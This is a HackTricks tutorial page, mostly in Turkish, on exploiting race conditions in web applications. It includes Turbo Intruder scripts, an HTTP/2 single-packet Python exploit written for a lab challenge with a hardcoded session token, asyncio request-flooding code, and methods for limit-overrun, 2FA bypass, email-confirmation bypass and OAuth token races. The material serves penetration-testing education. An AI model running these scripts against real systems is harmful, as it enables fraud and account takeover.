# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> For obtaining a deep understanding of this technique check the original report in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Race Condition Saldırılarının Geliştirilmesi

Race conditions'tan yararlanmanın temel engeli, birden fazla isteğin aynı anda işlenmesini sağlamak ve işleme süreleri arasındaki farkın **çok az olmasıdır — ideal olarak 1ms'den az**.

İstekleri senkronize etmek için bazı teknikler şunlardır:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Tek bir TCP bağlantısı üzerinden iki isteğin gönderilmesine izin verir; böylece ağ jitter'ının etkisini azaltır. Ancak sunucu tarafındaki farklılıklar nedeniyle, tutarlı bir race condition exploit'i için iki istek her zaman yeterli olmayabilir.
- **HTTP/1.1 'Last-Byte Sync'**: 20-30 isteğin çoğu kısmının önceden gönderilmesine, küçük bir parçanın geri tutulmasına izin verir; bu parçalar birlikte gönderildiğinde sunucuya eşzamanlı varış sağlanır.

**Preparation for Last-Byte Sync** şunları içerir:

1. Stream'i sonlandırmadan, başlıkları ve gövde verisini son bayt hariç göndermek.
2. İlk gönderimin ardından 100ms beklemek.
3. Son frameleri toplu halde göndermek için Nagle's algorithm'dan faydalanmak üzere TCP_NODELAY'ı devre dışı bırakmak.
4. Bağlantıyı ısıtmak için ping göndermek.

Geri tutulan framelerin daha sonra gönderilmesi, bunların tek bir pakette ulaşmasına yol açmalıdır; bu durum Wireshark ile doğrulanabilir. Bu yöntem, genellikle RC saldırılarında yer almayan statik dosyalar için geçerli değildir.

### Sunucu Mimarisine Uyum Sağlama

Hedefin mimarisini anlamak çok önemlidir. Front-end sunucular istekleri farklı şekilde yönlendirebilir; bu da zamanlamayı etkiler. Önceden sunucu tarafında bağlantıyı ısıtmak (önemsiz isteklerle) istek zamanlamasını normalize edebilir.

#### Handling Session-Based Locking

PHP gibi framework'lerin session handler'ları istekleri session bazında sıralayabilir; bu, zafiyetleri gizleyebilir. Her istek için farklı session token'ları kullanmak bu sorunun önüne geçebilir.

#### Overcoming Rate or Resource Limits

Bağlantı ısıtma etkisizse, web sunucularının rate veya kaynak limit gecikmelerini kasten tetiklemek için sahte istek seli göndermek, sunucu taraflı bir gecikme oluşturarak single-packet attack'i kolaylaştırabilir.

## Saldırı Örnekleri

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: İsteği **Turbo Intruder**'a gönderebilirsiniz (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), istekte brute force yapmak istediğiniz değeri **`%s`** olarak değiştirebilirsiniz; örneğin `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ve ardından açılır menüden **`examples/race-single-packer-attack.py`** dosyasını seçin:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Farklı değerler gönderecekseniz, kodu panodan alınan bir wordlist kullanan şu sürümle değiştirebilirsiniz:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Web sitesi HTTP2'yi desteklemiyorsa (sadece HTTP1.1), `Engine.THREADED` veya `Engine.BURP`'ı `Engine.BURP2` yerine kullanın.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: RCE'yi tetiklemek için önce 1 endpoint'e bir istek, ardından diğer endpoint'lere birden fazla istek göndermeniz gerekiyorsa, `race-single-packet-attack.py` script'ini şu şekilde değiştirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Ayrıca **Repeater** içinde Burp Suite'deki yeni '**Send group in parallel**' seçeneğiyle de mevcut.
- **limit-overrun** için gruba **aynı request'i 50 kez** ekleyebilirsiniz.
- **connection warming** için, **group**'un **beginning**'ine web sunucusunun statik olmayan bir kısmına birkaç **requests** ekleyebilirsiniz.
- Süreçte bir **request**'in işlenmesi ile diğerinin işlenmesi **between** gecikme (**delaying**) oluşturmak için, iki request arasına ekstra **requests** ekleyebilirsiniz (2 substates adımında).
- Bir **multi-endpoint** RC için, **gizli duruma giden request**'i göndermeye başlayıp hemen ardından **gizli durumu istismar eden** **50 request** gönderebilirsiniz.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Bu scriptin amacı, bir kullanıcının email'ini değiştirmek ve yeni email'in verification token'ı son email'e ulaşana kadar sürekli olarak doğrulamaktır (kodda, email'i değiştirmek mümkünken doğrulamanın eski email'e gönderildiği bir RC durumu görülüyordu; çünkü email'i gösteren değişken ilk olanla zaten doldurulmuştu).\
Alınan emaillerde "objetivo" kelimesi bulunduğunda, değiştirilen email'in verification token'ını aldığımızı biliriz ve saldırıyı sonlandırırız.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Single Packet Attack'ı İyileştirme

Orijinal araştırmada bu saldırının 1,500 byte ile sınırlı olduğu açıklanıyor. Ancak, [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), single packet attack'ın 1,500 baytlık sınırlamasının IP layer fragmentation kullanılarak (tek bir paketi birden fazla IP paketine bölme) ve parçaları farklı sırada göndererek TCP'nin **65,535 B pencere sınırlamasına** nasıl genişletilebileceğini açıkladı; bu, tüm fragment'ler sunucuya ulaşana kadar paket yeniden birleştirilmesinin engellenmesine olanak tanır. Bu teknik, araştırmacının yaklaşık 166ms içinde 10,000 istek göndermesine izin verdi.

Not: Bu geliştirme, yüzlerce/binlerce paketin aynı anda ulaşmasını gerektiren RC saldırılarını daha güvenilir hale getirse de bazı yazılım sınırlamaları olabilir. Apache, Nginx ve Go gibi bazı popüler HTTP sunucularında `SETTINGS_MAX_CONCURRENT_STREAMS` ayarı sırasıyla 100, 128 ve 250 ile katı tutuluyor. Ancak NodeJS ve nghttp2 gibi diğerlerinde bu sınırlama yok.\
Bu temelde Apache'nin tek bir TCP bağlantısından sadece 100 HTTP bağlantısını dikkate alacağı anlamına gelir (bu RC saldırısını sınırlayabilir).

You can find some examples using this tehcnique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Önceki araştırmadan önce, RC'ye neden olmak için paketleri mümkün olduğunca hızlı göndermeye çalışan bazı payloads kullanılıyordu.

- **Repeater:** Önceki bölümdeki örneklere bakın.
- **Intruder**: **request**'i **Intruder**'a gönderin, **Options menu** içinde **number of threads**'i **30** olarak ayarlayın, payload olarak **Null payloads**'i seçin ve **30** adet oluşturun.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Bu, bir eylemi gerçekleştirebileceğiniz sayıyı sınırlayan yerlerde ortaya çıkan en temel tür race condition'dır. Örneğin bir web mağazasında aynı indirim kodunu birkaç kez kullanmak. Çok basit bir örnek [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**this bug**](https://hackerone.com/reports/759247)**'da** bulunabilir.

Bu tür saldırıların birçok varyasyonu vardır, bunlar arasında:

- Bir hediye kartını birden fazla kez kullanma
- Bir ürünü birden fazla kez puanlama
- Hesap bakiyenizin üzerinde para çekme veya transfer etme
- Tek bir CAPTCHA çözümünü yeniden kullanma
- Bir anti-brute-force rate limit'ini atlatma

### **Gizli alt durumlar**

Karmaşık race condition'ları istismar etmek sıklıkla gizli veya **istenmeyen makine alt durumlarıyla** etkileşim kurmak için kısa süreli fırsatlardan yararlanmayı içerir. Yaklaşım şu şekilde olmalıdır:

1. **Potansiyel Gizli Alt Durumları Belirleyin**
- Kullanıcı profilleri veya password reset süreçleri gibi kritik verileri değiştiren veya onlarla etkileşen endpoint'leri tespit ederek başlayın. Şunlara odaklanın:
- **Storage**: Client-side verileri işleyen endpoint'lerden ziyade server-side persistent verileri manipüle eden endpoint'leri tercih edin.
- **Action**: Var olan veriyi değiştiren işlemleri arayın; yeni veri ekleyenlere göre istismar edilebilir koşullar yaratma olasılıkları daha yüksektir.
- **Keying**: Başarılı saldırılar genellikle aynı tanımlayıcıya (ör. kullanıcı adı veya reset token) bağlı işlemleri içerir.
2. **İlk Testleri Yapın**
- Belirlediğiniz endpoint'leri race condition saldırılarıyla test edin, beklenen sonuçlardan sapmaları gözlemleyin. Beklenmedik yanıtlar veya uygulama davranışındaki değişiklikler bir zafiyeti işaret edebilir.
3. **Zafiyeti Gösterin**
- Saldırıyı, genellikle sadece iki isteğe indirgenebilen en az sayıda istekle istismarı gösterecek şekilde daraltın. Bu adım, hassas zamanlama gerektirdiği için birden fazla deneme veya otomasyon gerektirebilir.

### Time Sensitive Attacks

İsteklerin zamanlamasındaki hassasiyet zafiyetleri ortaya çıkarabilir, özellikle security token'lar için timestamp gibi öngörülebilir yöntemler kullanıldığında. Örneğin, password reset token'larının timestamp bazlı üretilmesi eş zamanlı isteklerde aynı token'ların üretilmesine izin verebilir.

To Exploit:

- Eş zamanlı password reset istekleri yapmak için tek paket saldırısı gibi hassas zamanlama kullanın. Özdeş token'lar bir zafiyeti gösterir.

Example:

- Aynı anda iki password reset token isteyin ve karşılaştırın. Eşleşen token'lar token üretiminde bir hata olduğunu gösterir.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Gizli alt durum vaka çalışmaları

### Pay & add an Item

Bu [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) üzerinden bir mağazada **ödeme yaparken** ve **fazladan bir öğe ekleyerek** bunun için **ödeme yapmamanızı** nasıl sağlayabileceğinizi görebilirsiniz.

### Confirm other emails

Fikir, **bir e-posta adresini doğrulamak ve aynı anda farklı bir adrese değiştirmek** ve platformun değiştirilen yeni adresi doğrulayıp doğrulamadığını öğrenmektir.

### Change email to 2 emails addresses Cookie based

Bu [**this research**](https://portswigger.net/research/smashing-the-state-machine) çalışmasına göre Gitlab bu şekilde takeover'a karşı savunmasızdı çünkü bir e-postanın email verification token'ını diğer e-postaya **gönderebilir**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Eğer bir veritabanına bilgi eklemek için **2 farklı write** kullanılıyorsa, veritabanına sadece ilk verinin yazılmış olduğu kısa bir zaman dilimi vardır. Örneğin, kullanıcı oluştururken önce **username** ve **password** yazılabilir, ardından yeni oluşturulan hesabı onaylamak için **token** yazılabilir. Bu, kısa bir süre için hesabı onaylama token'ının null olduğu anlamına gelir.

Bu nedenle bir hesap kaydı oluşturup hesabı hemen onaylamak için boş bir token ile (`token=` veya `token[]=` veya başka bir varyasyon) birkaç istek göndermek, e-postasını kontrol etmediğiniz bir hesabı **onaylamanıza** izin verebilir.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

Aşağıdaki pseudo-code race condition'a karşı savunmasızdır çünkü çok kısa bir süre için session oluşturulurken 2FA uygulanmamaktadır:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Bu servisler bir uygulama oluşturmanıza ve provider'ın kayıtlı kullanıcılarını authenticate etmenize izin verir. Bunu yapabilmek için **client**'ın **uygulamanıza izin vermesi** gerekir, **OAUth provider** içinde bazı verilerine erişmesi için.\
Yani buraya kadar google/linkedin/github... ile yaygın bir login — karşınıza şu tarz bir sayfa çıkar: "_Uygulama \<InsertCoolName> bilgilerinize erişmek istiyor, izin vermek istiyor musunuz?_"

#### Race Condition in `authorization_code`

Problem, siz onayladığınızda ortaya çıkar ve otomatik olarak kötü amaçlı uygulamaya bir **`authorization_code`** gönderilir. Bu uygulama daha sonra OAUth service provider içindeki bir Race Condition'ı kötüye kullanarak hesabınız için `authorization_code`'dan birden fazla AT/RT (_Authentication Token/Refresh Token_) üretir. Temelde, uygulamaya verilerinize erişim izni vermenizin sağladığı durumu suistimal ederek **birden fazla hesap oluşturur**. Sonrasında uygulamanın verilerinize erişimine artık izin vermeyi bırakırsanız bir AT/RT çifti silinebilir, ancak diğerleri hâlâ geçerli olmaya devam eder.

#### Race Condition in `Refresh Token`

Geçerli bir RT elde ettiğinizde, bunu birden fazla AT/RT üretmek için kötüye kullanmayı deneyebilirsiniz ve kullanıcı kötü amaçlı uygulamanın verilerine erişim iznini iptal etse bile birden fazla RT hâlâ geçerli olacaktır.

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Referanslar

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
